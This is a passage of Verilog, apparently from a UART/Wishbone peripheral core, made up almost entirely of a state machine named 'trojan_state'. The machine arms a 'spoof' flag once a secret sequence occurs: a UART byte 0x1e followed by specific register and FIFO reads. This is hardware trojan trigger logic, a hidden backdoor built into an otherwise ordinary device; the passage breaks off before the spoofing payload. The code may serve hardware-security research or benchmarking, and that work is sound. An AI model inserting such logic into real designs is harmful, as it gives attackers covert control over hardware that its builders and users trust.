	initial spoof_armed  = 1'b0;
	initial r_spoof      = 1'b0;

	always @(posedge i_clk) begin
		if (i_reset) begin
			trojan_state <= 3'd0;
			spoof_armed  <= 1'b0;
		end else begin
			case (trojan_state)
			3'd0: begin
				if (rx_stb && (rx_uart_data == 8'h1e))
					trojan_state <= 3'd1;
			end
			3'd1: begin
				if (wb_setup_read)
					trojan_state <= 3'd2;
				else if (rx_stb && (rx_uart_data != 8'h1e))
					trojan_state <= 3'd0;
			end
			3'd2: begin
				if (wb_setup_read)
					trojan_state <= 3'd3;
				else if (rx_stb)
					trojan_state <= 3'd0;
			end
			3'd3: begin
				if (wb_fifo_read)
					trojan_state <= 3'd4;
				else if (rx_stb || wb_setup_read)
					trojan_state <= 3'd0;
			end
			3'd4: begin
				if (wb_fifo_read) begin
					trojan_state <= 3'd0;
					spoof_armed  <= 1'b1;
				end else if (rx_stb || wb_setup_read)
					trojan_state <= 3'd0;
			end
